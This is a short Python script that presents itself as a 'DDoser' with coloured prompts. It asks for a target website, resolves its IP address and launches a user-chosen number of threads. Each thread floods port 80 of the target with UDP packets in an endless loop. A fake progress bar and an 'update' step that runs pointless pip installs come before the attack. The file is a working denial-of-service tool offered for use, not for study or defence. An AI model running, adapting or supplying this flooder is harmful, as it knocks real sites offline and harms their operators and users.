#importing
import time,socket,sys,os,_thread




#color
class color:
    red = '\033[91m'
    sabz = '\033[92m'
    sefid = '\033[0m'
    narenji = '\033[93m'
    abi_kamrang = '\033[94m'


#update
update = input(color.red+'       Update Doser    n/y  ?   ')
fake_ip = "40.56.10.2"
counter = 0

if update == ('y') or update == ('Y'):
    print("")
    print(color.red+" [       ] 0%")
    time.sleep(1)
    print(color.abi_kamrang+" [=======   ] 20%")
    time.sleep(0.6)
    print(color.abi_kamrang+" [============ ] 40%")
    time.sleep(0.5)
    print(color.abi_kamrang+" [================ ] 60%")
    time.sleep(0.8)
    print(color.abi_kamrang+" [==================== ] 80%")
    time.sleep(0.6)
    print(color.abi_kamrang+" [========================= ] 100%")
    os.system('clear' or 'cls')
    os.system('python -m pip install pip')
    os.system('pip install pip')
    os.system('pip install os')
    os.system('pip install time')
    os.system('pip install sys')
    os.system('pip install socket')
    os.system('pip install colorama')
    os.system('pip install thread')
    print(color.sabz+'.')
    os.system('pip')
    os.system('cls' or 'clear')

if update == ('n') or update == ('N'):
    print("")
    print(color.red+" [       ] 0%")
    time.sleep(1)
    print(color.abi_kamrang+" [=======   ] 20%")
    time.sleep(0.6)
    print(color.abi_kamrang+" [============ ] 40%")
    time.sleep(0.5)
    print(color.abi_kamrang+" [================ ] 60%")
    time.sleep(0.8)
    print(color.abi_kamrang+" [==================== ] 80%")
    time.sleep(0.6)
    print(color.abi_kamrang+" [========================= ] 100%")
    os.system('cls' or 'clear')
    print('')
    print('')
    print('')




os.system('cls' or 'clear')
print('')
print(color.sabz+'''       \tW E L C O M   T O   D D O S E R     ''')
print('')
print(color.sefid+'------------------------------------------------------------')
print('')
print(color.narenji+'    Step 1.  Enter url')
print(color.narenji+'    Step 2.  Enter power attack')
print(color.narenji+'    Step 3.  Enter message attack ')
print(color.narenji+'    Step 3.  Start DDoser !!!')
print('')
print(color.sefid+'------------------------------------------------------------')
print('')
print('')
site = input(color.sabz+"      Enter target site url => ")
ip = socket.gethostbyname(site)
print('')
print("     your target IP:  ", ip)
print('')
thread_count = input(color.red+"      Enter power attack => ")
print('')
UDP_PORT = 80
MESSAGE = input(color.abi_kamrang+'      Enter message =>  ')
print(color.sefid+'------------------------------------------------------------')
time.sleep(2)
os.system('clear' or 'cls')
print(color.sabz+'''         \tS T A R T I N G    D D O S E R ''')
print('')
print(color.sefid+'------------------------------------------------------------')
print(color.sabz+"UDP target IP:", ip)
print(color.sabz+"UDP target port:", UDP_PORT)
time.sleep(5)
def ddos(i):
    while 1:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
        print(color.sabz+"       DDos ataack !!! ")
for i in range(int(thread_count)):
    try:
        _thread.start_new_thread(ddos, ("Thread-" + str(i),))
    except KeyboardInterrupt:
        sys.exit(0)
while 1:
    pass
